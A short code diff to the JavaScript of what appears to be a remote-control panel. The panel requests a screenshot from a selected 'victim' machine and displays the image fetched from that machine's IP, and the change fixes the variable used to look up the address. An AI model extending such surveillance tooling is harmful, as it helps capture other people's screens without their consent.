@@ -62,7 +62,7 @@
     $("#screen").on('click', function() { 
            
            socket.emit('client_screenshot', { toclient: $("#victim").val() }, function (data) {
-                $("#screen-op-body").html("<img src='http://" + ips[toclient] + "/s.png'></img>");
+                $("#screen-op-body").html("<img src='http://" + ips[$("#victim").val()] + "/s.png'></img>");
                 $("#screen-op").modal('show');
             });
 
